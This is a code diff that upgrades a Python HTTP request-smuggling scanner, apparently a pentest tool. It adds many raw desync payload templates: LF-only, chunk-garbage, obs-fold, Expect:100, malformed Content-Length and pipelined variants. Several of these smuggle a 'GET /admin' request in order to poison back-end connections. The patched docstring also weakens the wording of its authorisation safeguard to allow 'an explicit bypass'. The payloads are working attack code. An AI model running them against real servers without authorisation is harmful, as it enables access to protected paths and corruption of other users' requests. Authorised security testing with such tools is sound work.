@@ -1,21 +1,13 @@
 #!/usr/bin/python
 """
-HTTP Desync (Request Smuggling) Scanner - upgraded
-by nu11secur1ty 2025
+HTTP Desync (Request Smuggling) Scanner - upgraded + advanced payloads
+by nu11secur1ty 2025 (patched)
 
 Notes:
-- This is your legacy-style scanner upgraded with many more payload variants
-  (TE/CL permutations, chunk tricks, CL-mismatch, header-case/whitespace tricks).
-- Supports --proxy (host:port) for HTTP proxying. For HTTPS target with proxy,
-  the script will use CONNECT to establish a tunnel.
-- Safety: requires --auth-file containing the word 'AUTH' (unless you use --allow-local and target=localhost).
-
-Usage:
-  # Dry-run (list templates)
-  python3 http_desync_scanner.py --target example.com --auth-file permission.txt --dry-run
-
-  # Real scan, saving JSON + HTML, using Burp running on localhost:8080 as proxy
-  python3 http_desync_scanner.py --target example.com --port 80 --auth-file permission.txt --out report.json --html report.html --proxy 127.0.0.1:8080
+- Legacy + expanded payloads + additional deep templates (chunk tricks, LF-only,
+  folded headers, Expect:100, pipelined requests, HTTP/1.0, absolute-URI, etc.)
+- Supports --proxy (host:port). For HTTPS target with proxy the script uses CONNECT then TLS.
+- Safety: requires --auth-file containing the word 'AUTH' (unless you add an explicit bypass).
 """
 from __future__ import annotations
 import argparse
@@ -26,6 +18,7 @@ import json
 import html
 import sys
 import logging
+import os
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import List, Tuple, Dict, Optional
 
@@ -75,7 +68,7 @@ def join_lines(lines: List[str], trailing_body: bytes = b"") -> bytes:
 
 
 # -----------------------
-# Payload collection (expanded)
+# Payload collection (expanded + legacy)
 # -----------------------
 def payload_te_cl(host: str, path: str = "/") -> bytes:
     lines = [
@@ -261,8 +254,218 @@ def payload_http2_to_http1_hints(host: str, path: str = "/") -> List[Tuple[str, 
     return variants
 
 
+# -----------------------
+# Advanced / Deep payloads (new)
+# -----------------------
+def payload_lf_only(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates: List[Tuple[str, bytes]] = []
+    req_lines = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: 4",
+        "",
+    ]
+    raw = "\n".join(req_lines).encode("utf-8") + b"\n" + b"ABCD"
+    templates.append(("lf_only_cl", raw))
+    z = "Transfer-Encoding: chunked\n\n1\nA\n0\n\nGET /admin HTTP/1.1\nHost: %s\n\n" % host
+    templates.append(("lf_only_te_chunked_poison", z.encode("utf-8")))
+    return templates
+
+
+def payload_chunk_upper_hex_and_garbage(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Transfer-Encoding: chunked",
+        "",
+    ]
+    body = "A\r\n0123456789\r\n0\r\nGARBAGE\r\n"
+    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
+    templates.append(("chunk_upper_hex_garbage", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
+    return templates
+
+
+def payload_missing_final_crlf(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Transfer-Encoding: chunked",
+        "",
+    ]
+    body = "1\r\nA\r\n0\r\n"  # missing final \r\n
+    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
+    templates.append(("missing_final_crlf", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
+    return templates
+
+
+def payload_folded_headers_and_obs_fold(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: 5",
+        "X-Header: part1",
+        " part2",  # folded continuation line (obs-fold)
+        "",
+    ]
+    templates.append(("obs_fold_cl", join_lines(lines, b"hello")))
+    lines2 = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: 0",
+        "X-Fold: value",
+        "\tcontinuation",
+        "",
+    ]
+    templates.append(("obs_fold_tab", join_lines(lines2)))
+    return templates
+
+
+def payload_expect_100_continue_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines1 = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Expect: 100-continue",
+        "Content-Length: 4",
+        "",
+    ]
+    templates.append(("expect_cl", join_lines(lines1, b"ABCD")))
+
+    lines2 = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Expect: 100-continue",
+        "Transfer-Encoding: chunked",
+        "Content-Length: 4",
+        "",
+    ]
+    body = "0\r\n\r\n"
+    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
+    templates.append(("expect_te_cl_ambig", join_lines(lines2, body.encode("utf-8") + poison.encode("utf-8"))))
+    return templates
+
+
+def payload_negative_and_non_numeric_cl(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines1 = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: -1",
+        "",
+    ]
+    templates.append(("cl_negative", join_lines(lines1, b"")))
+    lines2 = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: abc",
+        "",
+    ]
+    templates.append(("cl_non_numeric", join_lines(lines2, b"")))
+    return templates
+
+
+def payload_pipelined_multiple_requests(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    control = f"GET / HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
+    ambiguous = (
+        f"POST {path} HTTP/1.1{CRLF}"
+        f"Host: {host}{CRLF}"
+        "User-Agent: DesyncScanner/1.4\r\n"
+        "Content-Length: 100\r\n"
+        "\r\n"
+        "ABCD"
+    )
+    raw = control.encode("utf-8") + ambiguous.encode("utf-8")
+    templates.append(("pipelined_control_then_ambig", raw))
+
+    post = (
+        f"POST {path} HTTP/1.1{CRLF}"
+        f"Host: {host}{CRLF}"
+        "User-Agent: DesyncScanner/1.4\r\n"
+        "Content-Length: 4\r\n"
+        "\r\n"
+        "ABCD"
+    )
+    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
+    templates.append(("pipelined_post_then_poison", (post + poison).encode("utf-8")))
+    return templates
+
+
+def payload_multiple_connection_headers(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Connection: keep-alive",
+        "Connection: close",
+        "Content-Length: 0",
+        "",
+    ]
+    templates.append(("dup_connection_keep_close", join_lines(lines)))
+    lines2 = [
+        f"POST {path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Connection: keep-alive",
+        "Transfer-Encoding: chunked",
+        "",
+    ]
+    templates.append(("conn_keep_te_chunked", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
+    return templates
+
+
+def payload_http10_and_absolute_uri(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates = []
+    lines = [
+        f"POST {path} HTTP/1.0",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: 4",
+        "",
+    ]
+    templates.append(("http10_cl", join_lines(lines, b"ABCD")))
+    abs_req = [
+        f"POST http://{host}{path} HTTP/1.1",
+        f"Host: {host}",
+        "User-Agent: DesyncScanner/1.4",
+        "Content-Length: 0",
+        "",
+    ]
+    templates.append(("absolute_uri_cl", join_lines(abs_req)))
+    return templates
+
+
+def advanced_payloads(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
+    templates: List[Tuple[str, bytes]] = []
+    templates.extend(payload_lf_only(host, path))
+    templates.extend(payload_chunk_upper_hex_and_garbage(host, path))
+    templates.extend(payload_missing_final_crlf(host, path))
+    templates.extend(payload_folded_headers_and_obs_fold(host, path))
+    templates.extend(payload_expect_100_continue_variants(host, path))
+    templates.extend(payload_negative_and_non_numeric_cl(host, path))
+    templates.extend(payload_pipelined_multiple_requests(host, path))
+    templates.extend(payload_multiple_connection_headers(host, path))
+    templates.extend(payload_http10_and_absolute_uri(host, path))
+    return templates
+
+
+# -----------------------
+# Aggregate all payloads (include advanced)
+# -----------------------
 def payload_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
-    # aggregate many payloads
     templates: List[Tuple[str, bytes]] = []
     templates.append(("te_cl", payload_te_cl(host, path)))
     templates.append(("cl_te", payload_cl_te(host, path)))
@@ -272,6 +475,8 @@ def payload_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
     templates.extend(payload_chunk_tricks(host, path))
     templates.extend(payload_cl_mismatch(host, path))
     templates.extend(payload_http2_to_http1_hints(host, path))
+    # append new deeper templates
+    templates.extend(advanced_payloads(host, path))
 
     # some small legacy extras
     extra = []
@@ -455,7 +660,7 @@ def generate_html_report(report: Dict, html_path: str) -> None:
   <div class="card">
     <h2 style="margin:0 0 8px 0">HTTP Desync Scanner Report</h2>
     <div style="color:#556">Target: {html.escape(report.get('target',''))}:{report.get('port')} Path: {html.escape(report.get('path','/'))} Generated: {html.escape(time.ctime(report.get('timestamp', time.time())))}</div>
-    <div style="margin-top:10px">RED=HIGH: {counts['red']} &nbsp; YELLOW=MEDIUM: {counts['yellow']} &nbsp;GREEN=LOW: {counts['green']}</div>
+    <div style="margin-top:10px">RED: {counts['red']} &nbsp; YELLOW: {counts['yellow']} &nbsp; GREEN: {counts['green']}</div>
   </div>
   <div style="margin-top:18px">
     {''.join(rows)}
@@ -545,19 +750,50 @@ def main(argv: Optional[List[str]] = None) -> None:
 
     indicators = parse_indicator_list(args.indicators)
     logger.info("Starting scan %s:%d%s (ssl=%s) proxy=%s", args.target, args.port, args.path, args.ssl, args.proxy)
-    report = scan_target(args.target, args.port, args.path, args.ssl, args.concurrency, args.timeout, args.proxy, indicators, args.large_threshold)
 
-    # write JSON
+    report = None
     try:
-        with open(args.out, 'w', encoding='utf-8') as fh:
+        report = scan_target(args.target, args.port, args.path, args.ssl, args.concurrency, args.timeout, args.proxy, indicators, args.large_threshold)
+    except Exception as exc:
+        logger.exception("Scan failed with an unexpected error: %s", exc)
+        report = {
+            "target": args.target,
+            "port": args.port,
+            "path": args.path,
+            "use_ssl": args.ssl,
+            "timestamp": int(time.time()),
+            "error": f"Scan failed: {str(exc)}",
+            "results": []
+        }
+
+    # Ensure output directory exists
+    try:
+        out_dir = os.path.dirname(args.out) or "."
+        if out_dir and not os.path.exists(out_dir):
+            os.makedirs(out_dir, exist_ok=True)
+    except Exception as e:
+        logger.error("Failed to ensure output directory exists (%s): %s", out_dir, e)
+
+    # Write JSON report (always attempt — even if scan failed we write minimal report)
+    try:
+        with open(args.out, "w", encoding="utf-8") as fh:
             json.dump(report, fh, indent=2)
         logger.info("JSON report written to %s", args.out)
     except Exception as e:
-        logger.error("Failed to write JSON report: %s", e)
+        logger.error("Failed to write JSON report to %s: %s", args.out, e)
+        # fallback: print a compact JSON to stdout for troubleshooting
+        try:
+            print("FALLBACK JSON REPORT:", json.dumps(report, indent=2))
+        except Exception:
+            logger.error("Also failed to print fallback JSON report.")
 
-    # html
+    # HTML output (optional) — try but do not crash if it fails
     if args.html:
-        generate_html_report(report, args.html)
+        try:
+            generate_html_report(report, args.html)
+            logger.info("HTML report written to %s", args.html)
+        except Exception as e:
+            logger.error("Failed to write HTML report: %s", e)
 
     # summary
     for r in report.get('results', []):
